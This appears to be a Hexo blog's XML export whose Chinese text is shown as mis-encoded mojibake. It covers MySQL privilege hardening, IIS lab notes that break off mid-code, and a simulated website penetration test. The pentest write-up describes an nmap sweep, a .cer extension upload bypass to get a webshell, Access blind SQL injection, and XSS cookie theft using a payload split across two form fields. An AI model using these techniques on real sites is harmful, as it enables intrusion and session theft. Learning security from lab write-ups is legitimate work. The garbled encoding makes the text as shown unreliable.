title="ç»“è¯­"></a>ç»“è¯­</h2><p>æœ¬æ¥è¿˜æƒ³å†™å†™Windowsä¸‹çš„é˜²ç«å¢™ï¼Œä½†ç”±äºæ˜¯å›¾å½¢åŒ–ç•Œé¢ï¼Œå­¦èµ·æ¥ä¹Ÿå®¹æ˜“ä¸Šæ‰‹ï¼Œå°±æ²¡å†™äº†ï¼Œæˆ‘æ¯”è¾ƒæ‡’~~~è¿ç”¨å¥½é˜²ç«å¢™ï¼Œå¯ä»¥éšè—ä½ è‡ªå·±çš„IPåœ°å€ï¼Œå‡å°‘è¢«æ”»å‡»çš„å¯èƒ½æ€§ï¼Œåœ¨ç”Ÿæ´»ä¸­å¤§æœ‰ç”¨å¤„ã€‚</p>]]></content>
      
      <categories>
          
          <category> ç¯å¢ƒéƒ¨ç½² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linuxå®‰å…¨ </tag>
            
            <tag> æœåŠ¡å™¨è¿ç»´ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Mysqlå®‰å…¨é…ç½®</title>
      <link href="/Mysql-security-1.html"/>
      <url>/Mysql-security-1.html</url>
      <content type="html"><![CDATA[<p>mysqlä¸­å­˜åœ¨4ä¸ªæ§åˆ¶æƒé™çš„è¡¨ï¼Œåˆ†åˆ«ä¸º<a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. mysql.USERè¡¨</span><br><span class="line">2. mysql.DBè¡¨</span><br><span class="line">3. mysql.TABLES_PRIVè¡¨</span><br><span class="line">4. mysql.COLUMNS_PRIVè¡¨</span><br></pre></td></tr></table></figure><p>è¦æ³¨æ„çš„æ˜¯ï¼ŒMysqlä¸­æœ‰ä¸€ä¸ªæ•°æ®åº“â€<code>information_schema</code>â€œï¼Œä¼¼ä¹é‡Œé¢ä¿å­˜çš„ä¹Ÿæ˜¯ä¸€äº›æƒé™ä¿¡æ¯ï¼Œä½†æ˜¯è¦æ˜ç™½çš„æ˜¯ï¼Œè¿™ä¸ªæ•°æ®åº“â€<code>information_schema</code>â€œæ˜¯ä¸ºç³»ç»Ÿç®¡ç†å‘˜æä¾›å…ƒæ•°æ®çš„ä¸€ä¸ªç®€ä¾¿æ–¹å¼ï¼Œå®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªè§†å›¾ï¼Œå¯ä»¥ç†è§£ä¸ºå¯¹Mysqlä¸­çš„ä¸€ä¸ªä¿¡æ¯çš„å°è£…ï¼Œå¯¹äºMysqlä¸»ç¨‹åºæ¥è¯´ï¼Œèº«ä»½è®¤è¯å’Œæˆæƒçš„ä¿¡æ¯çš„æ¥æºåªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯â€<code>mysql</code>â€œã€‚</p><p>åœ¨æˆ‘ä»¬è¿›è¡Œæ•°æ®åº“è¿æ¥ã€ç™»å½•çš„æ—¶å€™ï¼Œmysqlæƒé™è¡¨çš„éªŒè¯è¿‡ç¨‹ä¸ºï¼š</p><ol><li>å…ˆä»userè¡¨ä¸­çš„:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) Host</span><br><span class="line">2) User</span><br><span class="line">3) Password</span><br></pre></td></tr></table></figure><p>è¿™3ä¸ªå­—æ®µä¸­åˆ¤æ–­è¿æ¥çš„ipã€ç”¨æˆ·åã€å¯†ç æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™é€šè¿‡éªŒè¯ã€‚</p><ol start="2"><li>é€šè¿‡èº«ä»½è®¤è¯åï¼Œè¿›è¡Œæƒé™åˆ†é…ï¼ŒæŒ‰ç…§ä¸‹é¢çš„é¡ºåºè¿›è¡ŒéªŒè¯ã€‚</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1) user</span><br><span class="line">2) db</span><br><span class="line">3) tables_priv</span><br><span class="line">4) columns_priv</span><br></pre></td></tr></table></figure><p>å³å…ˆæ£€æŸ¥å…¨å±€æƒé™è¡¨userï¼Œå¦‚æœuserä¸­å¯¹åº”çš„æƒé™ä¸ºYï¼Œåˆ™æ­¤ç”¨æˆ·å¯¹æ‰€æœ‰æ•°æ®åº“çš„æƒé™éƒ½ä¸ºYï¼Œå°†<code>ä¸å†</code>æ£€æŸ¥<code>dbï¼Œtables_priv,columns_priv</code><br>å¦‚æœå…¨å±€æƒé™è¡¨<code>user</code>å¯¹åº”çš„æƒé™ä¸º<code>N</code>ï¼Œåˆ™åˆ°dbè¡¨ä¸­æ£€æŸ¥æ­¤ç”¨æˆ·å¯¹åº”çš„å…·ä½“æ•°æ®åº“ï¼Œå¹¶å¾—åˆ°dbä¸­ä¸ºYçš„æƒé™<br>å¦‚æœdbä¸­ä¸ºNï¼Œåˆ™æ£€æŸ¥<code>tables_priv</code>ä¸­æ­¤æ•°æ®åº“å¯¹åº”çš„å…·ä½“è¡¨ï¼Œå–å¾—è¡¨ä¸­çš„æƒé™Yï¼Œä»¥æ­¤ç±»æ¨ã€‚é€çº§ä¸‹é™</p><p>ç”¨è‡ªå·±çš„è¯è®²å°±æ˜¯å› ä¸ºæŸ¥æ‰¾ä»–ä»¬æƒé™æ˜¯å¦é…ç½®å¥½æ ¹æ®æƒ…å†µæŸ¥çœ‹<code>mysql</code>è¿™ä¸ªæ•°æ®åº“ä¸­çš„<code>userï¼Œdbï¼Œtables_privï¼Œcolumns_pri</code>ï¼Œä¸€æ—¦åœ¨æŸä¸ªçº§åˆ«è®¾ç½®å¥½äº†æƒé™å°±ä¸éœ€è¦ç½‘ä¸‹ä¸€çº§å»çœ‹ä»–æ˜¯å¦å­˜åœ¨æƒé™äº†ï¼Œå› ä¸ºä¸‹é¢ä¸€çº§çš„è¡¨éƒ½ä¸ä¼šæ˜¾ç¤ºï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢æ•°æ®åº“æ•°æ®å†—ä½™ã€‚å°±æ˜¯ä¾‹å¦‚ä½ è®¾ç½®çš„æ˜¯æ‰€æœ‰æ•°æ®åº“åŠè¡¨çš„æƒé™çš„è¯ï¼Œåˆ°æ—¶å€™å°±ç›´æ¥<code>select * from user;</code>å°±å¯ä»¥æŸ¥çœ‹å¯¹åº”çš„ç¨‹åºå•¦<br><a href="https://imgchr.com/i/PNNSfK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/26/PNNSfK.md.png" alt="PNNSfK.md.png"></a></p><p>å¯¹äºMysqlä¸­çš„è´¦æˆ·æƒé™ç›¸å…³çš„å®‰å…¨é…ç½®ï¼Œæ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li>é’ˆå¯¹æ¯ä¸ªç½‘ç«™å»ºç«‹ä¸€ä¸ªå•ç‹¬çš„è´¦æˆ·</li><li>ä¸ºæ¯ä¸ªç½‘ç«™å•ç‹¬å»ºç«‹ä¸€ä¸ªä¸“å±æ•°æ®åº“(è™½ç„¶DEDEã€DZæ™®é€šé‡‡ç”¨è¡¨å‰ç¼€çš„æ–¹æ³•æ¥å®ç°â€ä¸€åº“å¤šç«™â€ï¼Œä½†å¥½çš„åšæ³•è¿˜æ˜¯â€ä¸€åº“ä¸€ç«™â€)</li><li>æŒ‰ç…§<code>user-&gt;db-&gt;tables_priv-&gt;columns_pri</code>çš„é¡ºåºè¿›è¡Œç»†ç²’åº¦çš„æƒé™æ§åˆ¶</li><li>ä¸ºæ¯ä¸ªç”¨æˆ·å•ç‹¬é…ç½®ä¸€ä¸ªä¸“å±æ•°æ®åº“ï¼Œä¿è¯å½“å‰ç”¨æˆ·çš„æ‰€æœ‰æ“ä½œåªèƒ½å‘ç”Ÿåœ¨å®ƒè‡ªå·±çš„æ•°æ®åº“ä¸­ï¼Œé˜²æ­¢SQLæ³¨å…¥å‘ç”Ÿåï¼Œé»‘å®¢é€šè¿‡æ³¨å…¥ç‚¹è®¿é—®åˆ°ç³»ç»Ÿè¡¨</li></ol><p>è´¦æˆ·æƒé™å®‰å…¨é…ç½®éœ€è¦çš„å¸¸ç”¨å‘½ä»¤<br>1)æ–°å»ºä¸€ä¸ªç”¨æˆ·å¹¶ç»™äºˆç›¸åº”æ•°æ®åº“çš„æƒé™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant select,insert,update,delete,create,drop privileges on æ•°æ®åº“åå­—.è¡¨å to user@localhost identified by 'passwd';    //å¦‚æœæ˜¯*å·å°±æ˜¯ä»£è¡¨å…¨éƒ¨*.*ä»£è¡¨æ‰€æœ‰æ•°æ®åº“ä¸‹çš„å…¨éƒ¨è¡¨å</span><br><span class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.* <span class="keyword">to</span> <span class="keyword">user</span>@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'passwd'</span>;</span><br></pre></td></tr></table></figure><p>2) åˆ·æ–°æƒé™</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure><p>3)æ˜¾ç¤ºæˆæƒ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">grants</span>;  //è¿™å¥è¯åªæ˜¾ç¤ºå½“å‰ç™»å½•ç”¨æˆ·çš„æƒé™</span><br></pre></td></tr></table></figure><p>4) ç§»é™¤æˆæƒ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">delete</span> <span class="keyword">on</span> *.* <span class="keyword">from</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure><p>5) åˆ é™¤ç”¨æˆ·<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'user'</span>@<span class="string">'localhost'</span>;</span><br></pre></td></tr></table></figure></p><p>6) ç»™ç”¨æˆ·æ”¹å<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> <span class="string">'jack'</span>@<span class="string">'%'</span> <span class="keyword">to</span> <span class="string">'jim'</span>@<span class="string">'%'</span>;``</span><br></pre></td></tr></table></figure></p><p>7) ç»™ç”¨æˆ·æ”¹å¯†ç </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">PASSWORD</span> <span class="keyword">FOR</span> <span class="string">'root'</span>@<span class="string">'localhost'</span> = <span class="keyword">PASSWORD</span>(<span class="string">'123456'</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Mysqlå®‰å…¨é…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysqlå®‰å…¨é…ç½® </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è®°å½•ä¸€æ¬¡æ¨¡æ‹Ÿæ¸—é€</title>
      <link href="/pentest-1.html"/>
      <url>/pentest-1.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¤©è¿˜æ¨¡æ‹Ÿäº†ä¸€æ¬¡çœŸå®çš„æŒ–æ´è¿‡ç¨‹ï¼Œä»Šå¤©è¿™ç½‘ç«™ä¸€å…±æœ‰ä¸‰ä¸ªæ¼æ´ï¼ˆéƒ½æ˜¯è¦ç»è¿‡æé†’æ‰èƒ½å¼„å‡ºæ¥ï¼‰ï¼Œå› ä¸ºæ˜¯æ­çš„ç¯å¢ƒï¼Œç®€å•è®°å½•ä¸€ä¸‹æ€è·¯ï¼Œé¡ºä¾¿å½“ä¸ªå›é¡¾ï¼Œæºç å•¥çš„éƒ½æ²¡æœ‰äº†<a id="more"></a>ï¼Œè€å®Œå°±è¦æ±‚åˆ æ‰äº†ã€‚</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>è¿™å°æœåŠ¡å™¨æœ‰ä¸ªå‰æå°±æ˜¯è·Ÿæˆ‘ä»¬ä¸€ä¸ªç½‘æ®µçš„æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¼€äº†IISæœåŠ¡ï¼Œä½†æ˜¯å‰ææˆ‘ä»¬æ˜¯ä¸çŸ¥é“ä»–çš„ipçš„ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦ç”¨ä¸€ä¸‹nmapæ¥æ‰«ä¸€ä¸‹åŒä¸€ç½‘æ®µä¸‹çš„ip  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -PI -PT 192.168.1.0/24</span><br></pre></td></tr></table></figure><p>è®°å¾—å½“æ—¶å‡ºç°äº†ä¸‰ä¸ªipåœ°å€ï¼Œå†ä½¿ç”¨nmapå»æ‰«æå„ä¸ªipçš„ç«¯å£ï¼Œå‘½ä»¤æ˜¯<code>namp ä½ é”å®šçš„ipåœ°å€</code></p><p>å‘ç°ä¸­é—´çš„ç¬¬äºŒä¸ªipæ˜¯æœ‰å¼€IISæœåŠ¡çš„ï¼Œä½†æ˜¯ä¹Ÿå¼€äº†å…¶ä»–ç«¯å£çš„æœåŠ¡ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ç›®æ ‡ä¸è¦ä»…ä»…ç›¯ç€IISè¿™ä¸ªæœåŠ¡ç«¯å£ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦æŠŠå…¶ä»–ä¸æ˜¯å¸¸ç”¨ç«¯å£éƒ½æ˜¯å°è¯•ä¸€éï¼Œå…¶ä¸­ä¸€äº›å¸¸è§çš„ç«¯å£è¦çŸ¥é“ï¼Œå¸¸å¼€çš„æˆ‘ä»¬å°±å¯ä»¥é€‰æ‹©æ€§å¿½ç•¥ï¼Œæ¯”å¦‚<code>3306å¯ä»¥è¿œç¨‹è¿æ¥æ•°æ®åº“ï¼Œ3389è¿œç¨‹è¿æ¥ï¼Œ445ç«¯å£æ°¸æ’ä¹‹è“çš„ç«¯å£</code>ç­‰ç­‰ï¼Œé‡åˆ°è¿™äº›ç«¯å£å…ˆè®°ç€ï¼Œå› ä¸ºæˆ‘ä»¬å‰ææ˜¯ä¸å‡†ä½¿ç”¨msfæ‰“ï¼Œæ¯•ç«Ÿæˆ‘ä»¬ç»ƒçš„æ˜¯ç½‘ç«™æ¸—é€çš„æ€è·¯ã€‚æ‰€ä»¥è¿˜æ˜¯å›æ¥ç½‘ç«™çš„æ¸—é€æ€è·¯ä¸Šå§ã€‚</p><p>å½“æ—¶å°è¯•åˆ°å…¶ä¸­çš„<code>8888ç«¯å£</code>çš„æ—¶å€™ï¼Œå°±å‡ºç°äº†ä¸€ä¸ªç½‘ç«™ï¼Œéšä¾¿ç‚¹ä¸¤ä¸‹ï¼Œå‘ç°æ˜¯ä¸€ä¸ªaspçš„ç½‘ç«™ï¼Œè¿™ç‚¹å¾ˆé‡è¦ï¼Œä¸ç„¶åˆ°åæœŸçš„æ—¶å€™ä¸Šä¼ æœ¨é©¬çš„æ—¶å€™ä¼ äº†ä¸ªphpçš„å°é©¬å°±å¾ˆæç¬‘äº†ã€‚</p><p>é¦–å…ˆå…ˆæ‰«æä¸€æ³¢ç›®å½•ï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯ä¸€æ¬¾å¾ˆç»å…¸çš„æ‰«æå·¥å…·å¾¡å‰‘ï¼Œå…¶å®githubä¸Šè¿˜æœ‰å¾ˆå¤šç±»ä¼¼çš„æ‰«æå·¥å…·ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œæ‰«åˆ°äº†ä¸€ä¸ªç±»ä¼¼æºç çš„å‹ç¼©åŒ…ï¼Œè¿™åœ¨æ­£å¸¸æƒ…å†µä¸‹æ˜¯å¾ˆå¤§çš„æ¼æ´äº†ï¼Œæ‰“å¼€æºç ç¬¬ä¸€ä»¶äº‹æƒ…å…ˆè¦å»æ‰¾é…ç½®æ–‡ä»¶ï¼Œæ•°æ®åº“é…ç½®æ–‡ä»¶ä¹‹ç±»çš„ï¼Œç”±äºè¿™é‡Œç”¨çš„æ˜¯Accessæ•°æ®åº“ï¼Œè€Œ<code>Accessæ•°æ®åº“</code>ä½¿ç”¨çš„æ˜¯<code>æ–‡ä»¶å­˜å‚¨</code>ï¼Œåœ¨é‡Œé¢æˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°æ‰¾åˆ°åå°ç™»å½•ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œåªä¸è¿‡å¯†ç éœ€è¦è§£å¯†ä¸€ä¸‹ï¼Œæ­¤æ—¶ä¹Ÿæ‰«åˆ°äº†åå°äº†ç™»å½•é¡µé¢ï¼Œå…ˆç™»å½•ä¸€æ³¢ï¼Œè¿™æ—¶å€™æˆ‘çš„æ€è·¯å…ˆç‚¹ä¸€ä¸‹æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æœ‰ä¸Šä¼ çš„åœ°æ–¹ï¼Œå‘ç°æœ‰å›¾ç‰‡ä¸Šä¼ çš„åœ°æ–¹ï¼Œå› ä¸ºæºç å·²ç»å¾—åˆ°äº†ï¼Œæˆ‘å°±å»çœ‹æºç å…³äºä¸Šä¼ è¿™ä¸€éƒ¨åˆ†çš„ä»£ç ï¼Œè¿™é‡Œé¢æˆ‘å®¡è®¡å‡ºæ¥å¯ä»¥ç”¨<code>cer</code>å»æ”¹åç¼€åä¸Šä¼ å»æ‰§è¡Œï¼Œè¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ä¸‹å¸¸è§çš„é™¤äº†<code>aspï¼Œaspx</code>å¯ä»¥æ‰§è¡Œä»¥å¤–ï¼Œè¿˜æœ‰<code>cgiï¼Œcer</code>ä¹‹ç±»çš„åç¼€åå¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸‹ï¼Œæœ€åä¸Šä¼ ä¹‹åå°±è·å¾—äº†ç½‘ç«™çš„å…¨æƒé™äº†ã€‚</p><p>ç¬¬äºŒä¸ªæ¼æ´æ˜¯åœ¨æŸä¸€ä¸ªäºŒçº§åŸŸåä¸‹å­˜åœ¨çš„SQLæ³¨å…¥æ¼æ´ï¼Œç”¨çš„<code>and 1=1</code>è¿˜æœ‰<code>and1=2</code>æµ‹å‡ºæ¥çš„ï¼ŒæœåŠ¡å™¨è¿”å›äº†500ä½œä¸ºç›²æ³¨çš„å›æ˜¾ç‚¹ï¼Œå‚è€ƒäº†è¿™ç¯‡æ–‡ç« :<code>https://blog.csdn.net/u011781521/article/details/53942183</code>, Accessæ•°æ®åº“çš„æ³¨å…¥æ¯”è¾ƒéº»çƒ¦ï¼Œæˆ‘å°è¯•å‡ºæ¥æ˜¯ä¸€ä¸ªç›²æ³¨ï¼Œä½†æ˜¯Accessç›²æ³¨åœ¨åæœŸçš„è¡¨åå…¨é çŒœï¼Œå­—å…¸é‡Œé¢æ²¡æœ‰å°±GGäº†ã€‚åé¢ä¹Ÿæ˜¯è·å¾—åå°ç™»å½•çš„å¯†ç ã€‚å›åˆ°å‰é¢çš„æ­¥éª¤å»getshelläº†ã€‚</p><p>ç¬¬ä¸‰ä¸ªæ¼æ´æ˜¯ä¸€ä¸ªXSSæ¼æ´ï¼Œè¿™é‡Œä¹Ÿæ˜¯åˆ«äººæé†’æˆ‘æ‰ä¼šç”¨è¿™ç§éªšæ“ä½œå»å¾—åˆ°ç®¡ç†å‘˜çš„cookieç„¶åç™»é™†åå°ï¼Œå½“æ—¶æ•™æˆ‘ç”¨xsså¹³å°å»å®ç°è¿™ä¸€è¿‡ç¨‹ï¼Œåœ¨ä¸€ä¸ªå¡«å†™ç®€å†çš„çš„è¡¨å•é‡Œé¢å»å®ç°ï¼Œæµ‹è¯•å‘ç°æœ€å¤§çš„ä¸¤ä¸ªæ–‡æœ¬æ¡†å·²ç»æ˜¯ç¼–ç å®ä¾‹åŒ–äº†ï¼Œè¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼Œå°±ä¸å¯ä»¥åˆ©ç”¨äº†ï¼Œé—®é¢˜æ˜¯åœ¨ä¸Šé¢å¡«å†™å­¦å†è¿˜æœ‰å§“åä¹‹ç±»çš„åœ°æ–¹å­˜åœ¨xssï¼Œè¿™é‡Œä¸å¾—ä¸èµä¸€æ³¢è¿™ä¸ªxsså¹³å°ï¼Œèƒ½å°†ä¸€å¤§æ®µjsä»£ç ï¼Œå˜æˆä¸€ä¸ªçŸ­é“¾æ¥ï¼Œç¼©å°äº†ä»£ç é‡ï¼Œåˆ«äººå°±ä¼šæ›´å¤§çš„æœºä¼šå»ç‚¹å‡»ï¼Œè¿™é‡Œè¿˜å­¦åˆ°çš„å°±æ˜¯xssåœ¨ç‚¹å‡»æŸ¥çœ‹æºç çš„æ—¶å€™åº”è¯¥æ˜¯è¦æŸ¥çœ‹æ¡†æ¶çš„æºç ï¼Œæœ‰æ—¶å€™å¯èƒ½ç›´æ¥å³é”®çœ‹æºç çœ‹åˆ°çš„æ˜¯å…¶ä»–divçš„ä»£ç äº†ï¼Œå°±çœ‹ä¸æ¸…æ¥šxssæ˜¯å¦èµ·äº†ä½œç”¨ï¼Œè€Œä¸”è¿™é‡Œçš„æ–‡æœ¬æ¡†é™åˆ¶äº†å¤§å°æˆ‘ä»¬å¯ä»¥ç”¨Bpå»å®ç°å‘åŒ…å®ç°ï¼Œä½†æ˜¯æˆ‘æŸ¥çœ‹æºç å‘ç°ç¼ºäº†ä¸€æ®µï¼ŒåŸå› å°±æ˜¯Accessé‡Œé¢é™åˆ¶äº†å¤§å°ï¼Œé‚£è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥è¿™æ ·å»ç»•è¿‡ï¼Œæ³¨é‡Šç¬¦æ˜¯ä¸€ä¸ªå¥½ä¸œè¥¿ï¼Œåˆ†åˆ«åœ¨ä¸¤ä¸ªæ–‡æœ¬æ¡†é‡Œé¢å¡«å…¥<code>/*</code>å’Œ<code>*/</code>,å°±ä¾‹å¦‚åœ¨å§“åé‡Œé¢å¡«å…¥<code>&lt;script&gt;alert(1)/*</code>åœ¨å­¦å†çš„æ¡†é‡Œé¢å¡«å…¥<code>*/&lt;/script&gt;</code>è¿™æ ·æµ‹è¯•å°±å¾ˆOKï¼Œå³é”®æŸ¥çœ‹æºç å°±å¯ä»¥å‘ç°åœ¨/**/é‡Œé¢å°±å¾ˆå¤šå…¶ä»–ä»£ç ï¼Œä½†æ˜¯å°±ç›¸å½“äºæ³¨é‡Šæ‰äº†ï¼Œåˆšå¥½æŠŠä¸¤ä¸ªæ¡†é‡Œé¢çš„ä»£ç æ‹¼åœ¨ä¸€èµ·äº†ï¼Œåªæ˜¯ä¾‹ä¸¾äº†ä¸€ä¸ªåå°„å‹xssã€‚è¿™æ ·å°±å¯ä»¥è¿”å›ä½ çš„xsså¹³å°çœ‹ä½ æ‰“çš„ç»“æœã€‚ç„¶åå°±å¯ä»¥æŠŠcookieè·å¾—æœ€å¥½çš„æ–¹æ³•å°±æ˜¯ç›´æ¥åœ¨æµè§ˆå™¨é‡Œé¢æ”¹å˜ä½ éœ€è¦çš„cookieï¼Œä¸ç„¶çš„è¯å°è¯•ä¸€ä¸‹ç”¨bpå‘åŒ…æ¯ä¸€æ¬¡éƒ½æ˜¯éœ€è¦æ”¹ä¸€æ¬¡cookieçš„ï¼Œå› ä¸ºé¡µé¢çš„æ¯ä¸€éƒ¨åˆ†åŠŸèƒ½æ‰“å¼€éƒ½æ˜¯éœ€è¦é‡æ–°ä½¿ç”¨cookieï¼Œè€Œæœ¬åœ°ä¿å­˜çš„åˆä¸æ˜¯ä½ xssæ‰“å›æ¥çš„cookieï¼Œå› æ­¤éœ€è¦ä¿®æ”¹å¤šæ¬¡cookieï¼Œè€Œæœ€å¥½çš„è§£å†³æ–¹æ³•å°±æ˜¯ç›´æ¥ä¿®æ”¹æµè§ˆå™¨æœ¬åœ°ä¿å­˜çš„cookieå°±å¥½ã€‚ç™»å½•åå°åˆå›åˆ°ä¸Šä¼ æ¼æ´å»äº†ï¼Œ233333ã€‚</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>å…¨æ–‡å­—ï¼Œæ²¡æœ‰å›¾ç‰‡ï¼Œç»ˆäºæŠŠä»Šå¤©çš„æ€è·¯å›æƒ³äº†ä¸€éã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> ç½‘ç«™æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç½‘ç«™æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>è®¡ç½‘å®éªŒç¬”è®°(äºŒ)</title>
      <link href="/comp-net-2.html"/>
      <url>/comp-net-2.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ç¯‡åšå®¢æ˜¯æ¥ç€ä¸Šä¸€ç¯‡çš„å®éªŒæ€»ç»“ï¼Œè¿™éƒ¨åˆ†çš„å®éªŒæ˜¯ç½‘ç»œæœåŠ¡å™¨é…ç½®è®¾è®¡ï¼Œè¿™éƒ¨åˆ†æ„Ÿè§‰å°±æœ‰ç‚¹æ°´ã€‚<br><a id="more"></a></p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p><strong>å®éªŒå†…å®¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(1) åœ¨PCæœºä¸Šä¸‹è½½å®‰è£…IISï¼Œå­¦ä¹ IISçš„ç»„æˆå’ŒåŠŸèƒ½ï¼Œä»¥åŠIISçš„ä½¿ç”¨æ–¹æ³•ã€‚</span><br><span class="line">(2) åˆ†åˆ«åœ¨æœ¬æœºè¿›è¡ŒWebServerã€EmailServerã€FTPServerçš„é…ç½®è®¾è®¡ï¼›</span><br><span class="line">(3) é€šè¿‡å¦å¤–ä¸€å°æ¥å…¥äº’è”ç½‘çš„PCæœºï¼ˆæˆ–è‡ªå·±çš„æ‰‹æœºï¼‰çš„é€šç”¨å®¢æˆ·ç¨‹åºï¼ˆæµè§ˆå™¨æˆ–DOSç»ˆç«¯ï¼‰è®¿é—®è‡ªå·±è®¾ç½®çš„WebServerã€EmailServerã€FTPServerã€‚</span><br></pre></td></tr></table></figure><h3 id="å®éªŒå†…å®¹ä¸€"><a href="#å®éªŒå†…å®¹ä¸€" class="headerlink" title="å®éªŒå†…å®¹ä¸€"></a>å®éªŒå†…å®¹ä¸€</h3><p>é¦–å…ˆä»æ§åˆ¶é¢æ¿é‡Œé¢æ‰¾åˆ°ç¨‹åºç„¶åå»é€‰æ‹©æ‰“å¼€æˆ–å…³é—­windowsåŠŸèƒ½ï¼Œé€‰æ‹©Webç®¡ç†å·¥å…·è¿˜æœ‰ä¸‡ç»´ç½‘æœåŠ¡<br><img src="https://s1.ax1x.com/2018/07/20/P3oe8H.png" alt="P3oe8H.png"><br>ç„¶åå›å»æ§åˆ¶é¢æ¿é‡Œé¢é€‰æ‹©ç®¡ç†å·¥å…·ï¼Œæ‰“å¼€ç¬¬ä¸€ä¸ªIISç®¡ç†å™¨<br><a href="https://imgchr.com/i/P3onxA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3onxA.md.png" alt="P3onxA.md.png"></a><br>ç‚¹å‡»å·¦è¾¹çš„ç½‘ç«™ç„¶åå»æ–°å»ºä¸€ä¸ªç½‘ç«™ï¼Œæˆ‘çš„é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼ŒIPåœ°å€ä¸º192.168.19.1ï¼Œç½‘ç«™çš„æºç ç›®å½•åœ¨æ”¾åœ¨è¯¥ç”µè„‘ä¸‹çš„Cç›˜ç›®å½•ä¸‹çš„wwwç›®å½•ä¸‹ï¼Œè¿™é‡Œå¯ä»¥è‡ªå·±è®¾ç½®åŸŸå<br><img src="https://s1.ax1x.com/2018/07/20/P3oKKI.png" alt="P3oKKI.png"></p><p>ç‚¹å‡»æ–°å»ºç«‹çš„ç½‘ç«™è¿˜å¯ä»¥å»è®¾å®šé»˜è®¤çš„é¡µé¢æ˜¯ä»€ä¹ˆ<br><a href="https://imgchr.com/i/P3oMrt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3oMrt.md.png" alt="P3oMrt.md.png"></a><br>åœ¨wwwç›®å½•ä¸‹ç¼–å†™ä¸€ä¸ªHTMLé¡µé¢ï¼Œä»£ç å†…å®¹å¦‚ä¸‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 